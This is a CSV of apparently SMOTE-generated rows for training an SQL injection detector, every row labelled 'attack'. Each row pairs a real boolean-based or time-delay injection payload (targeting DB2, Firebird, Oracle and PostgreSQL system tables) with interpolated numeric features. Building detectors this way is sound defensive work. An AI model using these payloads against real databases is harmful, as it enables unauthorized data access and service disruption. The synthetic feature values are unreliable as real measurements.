id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000460,attack,boolean,"1  )   as wxms where 7272  =  7272 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000051,0.4769495075529549,154.26417576156842,32.19541601703083,4.08839042214227,80.45959177859925,16.0,42.60916796593835,15.195416017030826,0.5210115059921564,0.10386054909869963,0.27639213455547096,0.09873581035367304,0.0,0.19541601703082712,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,5.0,0.0,0.0,2.0,5.0,0.0,0.19541601703082703,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000461,attack,boolean,"1%""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000116,0.7638142119059119,81.16936716918238,20.19124776262354,2.980247414902496,11.382495525247073,13.0,41.58833035016472,15.19854129377059,0.13622155458804444,0.16164832054076717,0.5135869003704463,0.18854322450074207,0.0,4.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,6.397082587541179,1.6029174124588201,0.19854129377058982,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000462,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000081,1.5252256416149104,117.5657593762349,28.207506575700922,3.820933224798093,45.37717291748993,14.0,41.52822649773028,16.66035996101468,0.37893442378490527,0.12206822425286845,0.3553001849368807,0.14369716702534555,2.6603599610146804,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,8.547146614686241,0.0,1.0,3.1132133463284397,1.0,0.8867866536715603,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.11321334632843982,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1132133463284397
SMOTE_000463,attack,boolean,"1' in boolean mode  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",nearest_attack_euclidean,R000091,0.21769925275996335,124.22325178620594,33.04465035724119,3.775539638828314,44.04465035724119,15.0,49.11162589310297,16.06697553586178,0.3545807393900365,0.12076620264846599,0.3953359577046628,0.12931710025683474,2.977674821379406,0.08930071448237431,0.0,1.0,0.0,1.0,0.0,9.022325178620594,0.0,0.0,1.0,2.0,1.0,0.022325178620593578,0.0,0.9776748213794065,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.02232517862059369,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0223251786205934
SMOTE_000464,attack,boolean,"1%""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000116,1.686344811705339,82.24441829243884,20.123803919808324,2.9671787923948534,12.371411759424966,13.0,42.24760783961664,14.625398693397226,0.14719551032450018,0.15910126476356432,0.5142413403671939,0.17946188454474155,0.0,4.0,0.0,-1.3877787807814457e-17,0.37460130660277396,1.6253986933972262,0.0,6.749202613205548,1.2507973867944522,0.0,0.6253986933972261,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000465,attack,boolean,"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000016,2.445158366925044,152.42521437745685,36.08504287549137,3.9804098427088563,46.73386790760127,23.478739281127158,54.60630359436421,27.606303594364213,0.30554579435766166,0.15491983276217577,0.358719525420447,0.18081484745971554,1.5637821566185282,0.47873928112715725,2.0,-1.3877787807814457e-17,0.0,2.0,0.0,10.521260718872842,0.0,2.0,1.0,11.042521437745686,0.5212607188728428,0.4787392811271572,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.5212607188728428,0.0,1.0,0.0,0.5212607188728429,0.47873928112715725,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.521260718872843
SMOTE_000466,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000088,1.160671986710454,89.93187497436938,28.507708273528547,3.5530303606512104,20.356041675210204,14.931874974369379,40.0,14.643958324789793,0.2264937928267659,0.16582050737733559,0.4448957293987543,0.16278997039714416,4.0,0.0,0.6439583247897924,-1.3877787807814457e-17,0.0,2.0,0.0,6.0,0.0,1.0,1.0,2.643958324789793,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3560416752102076,0.6439583247897925,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000467,attack,boolean,"1' in boolean mode  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000011,0.9306042568666405,139.97456727724781,30.0,4.036645130550259,81.26997021924865,8.0,35.991522425749274,14.713074632249896,0.580415201832561,0.05743580612504205,0.25675225849994393,0.10539673354245302,0.713074632249896,0.28692536775010413,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,4.713074632249896,0.0,0.0,2.0,4.0,0.713074632249896,0.286925367750104,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000468,attack,boolean,"-9281  )   where 8363  =  8363 or make_set  (  8220  =  5127,5127  )  --",nearest_attack_euclidean,R000010,0.5411764121192996,74.05118097567879,26.455817994595286,3.8644056792911146,15.367453983785865,24.0,24.45581799459529,10.227908997297643,0.2064026325742591,0.3248922593593465,0.330519642008671,0.13818546605772333,0.0,0.2279089972976438,3.0,-1.3877787807814457e-17,0.0,2.0,0.0,3.0,0.0,1.0,1.0,5.0,0.0,0.2279089972976438,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000469,attack,boolean,"-4641""  )   where 4212  =  4212 or make_set  (  3595  =  4062,4062  )  --",nearest_attack_euclidean,R000030,0.02802790751083722,73.22330250086438,26.055825625216094,3.8184217456426217,14.167476875648287,24.0,24.055825625216098,11.0,0.19331973226961333,0.32786077117863266,0.32854997642821404,0.15026952012353995,0.0,1.0,3.0,-1.3877787807814457e-17,0.0,2.0,0.0,3.0,0.0,1.0,1.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000470,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000093,0.13122117330476268,74.01181624575963,26.252954061439908,3.7917644538524207,14.758862184319721,24.0,24.252954061439908,11.0,0.19875384948667424,0.3246603095047808,0.32778319915218707,0.14880264185635786,0.0,1.0,3.0,-1.3877787807814457e-17,0.0,2.0,0.0,3.0,0.0,1.0,1.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000471,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",nearest_attack_euclidean,R000036,1.3761274409754638,153.85625660149967,30.511978616541693,4.038418424209103,78.58385031579186,8.511978616541695,47.78438490224949,18.97604276691661,0.5124238515799926,0.055534903962612917,0.30877090194571105,0.12327034251168346,4.0,0.0,0.0,-1.3877787807814457e-17,1.0,2.0,0.0,5.952085533833221,0.0,0.0,2.511978616541695,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000472,attack,boolean,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000144,2.1111498634771646,143.1116993269679,31.39409981644579,4.1776275825799285,80.11169932696791,8.464699938815265,37.0,17.535300061184735,0.5591400183639227,0.059101011425968436,0.25891776699261687,0.12284120321749203,4.0,0.0,0.0,-1.3877787807814457e-17,1.0,1.535300061184736,0.0,4.0,1.0706001223694719,0.0,2.464699938815264,2.535300061184736,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.5353000611847358,0.46469993881526406,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000473,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000048,0.46672785417913726,141.8876835883277,29.33694923501691,4.005399252947513,67.2246328233446,16.0,44.55073435331079,14.112316411672303,0.47379997305448895,0.11276581073752656,0.3139675615171005,0.09946665469088398,0.0,0.0,0.22463282334460621,-1.3877787807814457e-17,1.0,2.0,0.0,5.887683588327697,0.0,0.0,2.0,3.2246328233446064,0.0,0.0,0.11231641167230311,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.11231641167230313,1.0,0.8876835883276969,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000474,attack,boolean,"1"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000042,0.4954438234691585,125.32921163150678,30.329211631506787,4.042548142656452,72.0,8.0,31.0,14.329211631506785,0.5744950325416832,0.06383278139352036,0.2473520278998914,0.11432015816490496,0.0,1.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,4.0,0.32921163150678545,0.0,2.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000475,attack,boolean,"-4641""  )   where 4212  =  4212 or make_set  (  3595  =  4062,4062  )  --",nearest_attack_euclidean,R000030,0.3427010109278989,75.73034984008513,26.68258746002128,3.8508585023796296,16.047762380063848,24.0,24.68258746002128,11.0,0.21059728665372382,0.31768503362725464,0.32611203930652977,0.14560564041249172,0.0,1.0,3.0,-1.3877787807814457e-17,0.0,2.0,0.0,3.0,0.0,1.0,1.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000476,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'vcgc' like 'vcgc",nearest_attack_euclidean,R000147,0.16186074762046185,134.77858074692918,28.755716149385837,3.9904430185608657,84.0,3.0,34.02286459754335,13.755716149385837,0.6234058833216181,0.022264495832914927,0.25229340251029264,0.10203621833517429,3.0,0.0,0.0,-1.3877787807814457e-17,1.0,0.0,0.0,4.755716149385837,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000477,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",nearest_attack_euclidean,R000115,2.959195973996285,135.0936888645068,28.289761611728505,4.001117040237216,76.86928483518552,4.934642417592761,37.96732120879638,15.322440402932127,0.5691369360309766,0.03522672723220588,0.2818411784759992,0.11379515826081826,2.3551191941357468,0.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,5.0,0.0,0.0,2.3224404029321266,2.0,1.0,0.0,0.0,0.3224404029321267,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000478,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000062,0.8009904844630465,77.72007048787567,24.75062140605914,3.631992620504497,20.781172324242608,13.656483027272177,30.62593210908871,12.656483027272177,0.26977803263269434,0.1757081716180216,0.39176670662489543,0.16274708912438865,4.0,0.0,0.21882767575739237,-1.3877787807814457e-17,0.0,2.0,0.0,4.437655351514785,0.0,1.0,1.0,2.2188276757573924,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.7811723242426076,0.21882767575739237,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000479,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",nearest_attack_euclidean,R000036,1.4171332557614487,139.9287413584235,29.3857482716847,4.110180401339368,78.36793361129057,6.578622407527053,38.19287413584235,16.789311203763525,0.5606153601710451,0.04572832791850677,0.27382413741164224,0.11983217449880589,3.5964370679211752,0.0,0.0,-1.3877787807814457e-17,1.0,1.5964370679211755,0.0,4.403562932078825,0.0,0.0,2.5964370679211752,2.5964370679211752,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.5964370679211755,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5964370679211752
SMOTE_000480,attack,boolean,"1""   )    )    as sqzh where 5672  =  5672 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000155,0.3784218109939127,157.5822853719239,33.0,4.08638536937973,74.0,18.0,45.07053031879189,20.51175505313198,0.469827816507124,0.11428244185308423,0.285730647877436,0.1301590937623557,0.0,1.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,5.511755053131981,0.0,5.0,4.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000481,attack,boolean,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000003,1.222707932752814,72.40155603637331,24.854025696504614,3.514608650654881,25.99272662517743,6.5620770895138385,29.277401857345634,10.56935046433641,0.36109719116882055,0.08468787602246935,0.4066253774717476,0.14758955533696255,0.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.7153247678317958,0.0,3.138700928672817,0.0,0.28467523216820423,0.28467523216820423,5.4306495356635915,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.7153247678317958,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7153247678317958
SMOTE_000482,attack,boolean,"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000095,3.551331570560237e-05,91.0003083325704,29.0,3.701674274548095,32.000385415713,12.999951823035875,34.9999614584287,11.000009635392825,0.3516506036082936,0.14285639306466982,0.38461410712740535,0.12087889619963127,1.0,0.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,5.99998072921435,0.0,0.9999903646071752,1.000009635392825,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000483,attack,boolean,"1""  )   as gtpi where 8100  =  8100 and make_set  (  2678  =  9169,9169  )  --",nearest_attack_euclidean,R000018,0.8360289017230151,77.56748139845931,27.918703496148265,3.8404010850382426,19.48618489460757,21.0,27.29755580462208,9.783740699229654,0.2508443509466507,0.2707629707544458,0.3523034474359953,0.1260892308629082,0.0,0.7837406992296532,2.0,-1.3877787807814457e-17,0.21625930077034694,2.0,0.0,3.216259300770347,0.0,0.7837406992296531,0.7837406992296532,4.216259300770346,0.0,0.7837406992296532,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000484,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000146,1.243640753877956,133.63905572938023,36.69445961176184,3.9768747396183617,45.77783844704736,21.0,49.083378835285515,17.77783844704736,0.342516988064223,0.15737341152143525,0.36742382771203247,0.13268577270230933,3.0833788352855187,0.0,0.6110807764763206,-1.3877787807814457e-17,1.0,2.0,0.0,7.69445961176184,0.0,1.0,1.0,5.0,1.0,0.0,0.3055403882381604,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.6944596117618396,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.69445961176184
SMOTE_000485,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",nearest_attack_euclidean,R000036,1.121762207773195,152.7737783136771,30.602185140526906,4.076096816368903,79.21529598368835,8.602185140526908,46.160667470515655,18.795629718946184,0.5201188337780556,0.05651010962731792,0.3004054658531634,0.12296559074146315,4.0,0.0,0.0,-1.3877787807814457e-17,1.0,2.0,0.0,5.591259437892368,0.0,0.0,2.602185140526908,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000486,attack,boolean,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",nearest_attack_euclidean,R000035,2.444064541023781,134.5168302885908,30.93539621392615,3.8360408876394425,42.855320823406174,15.532301893036925,51.064603786073846,25.06460378607385,0.3172729545646836,0.11565602415570034,0.3805219406782788,0.18654908060133724,0.0,2.1292075721477004,0.9353962139261498,-1.3877787807814457e-17,0.0,1.5323018930369252,0.0,10.467698106963073,0.0,2.0,1.0,8.467698106963075,0.0,0.532301893036925,0.46769810696307496,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.5323018930369252,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.532301893036925
SMOTE_000487,attack,boolean,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,nearest_attack_euclidean,R000017,0.29929194008301535,77.5147369648459,19.25736848242295,2.932372955969808,5.686315953127867,16.0,40.0,15.828421011718033,0.07280122728315064,0.20650355320958624,0.5162588830239655,0.2044363364832975,0.0,4.0,1.0,-1.3877787807814457e-17,1.0,2.0,0.0,6.0,1.8284210117180335,0.0,0.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000488,attack,boolean,"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",nearest_attack_euclidean,R000050,1.849773924407448,120.81587544767027,28.06275964982079,4.027950366203646,64.06275964982079,7.656899124551974,29.439317548745528,19.656899124551973,0.5356134585993674,0.0618515093168934,0.24018394475911922,0.16235108732461995,3.531379824910395,0.0,0.0,-1.3877787807814457e-17,1.0,1.531379824910395,0.0,3.06275964982079,1.531379824910395,5.0,4.0,2.5313798249103954,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.5313798249103949,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.531379824910395
SMOTE_000489,attack,boolean,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,nearest_attack_euclidean,R000017,0.8965136528625207,75.08105513907167,18.61621102781433,2.838301770876199,5.0,14.46484411125733,40.0,15.616211027814332,0.06666571506216479,0.19200867863305696,0.5333257204973184,0.2079998858074598,0.0,4.0,1.0,-1.3877787807814457e-17,0.6162110278143325,2.0,0.0,6.0,2.0,0.0,0.0,3.6162110278143325,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
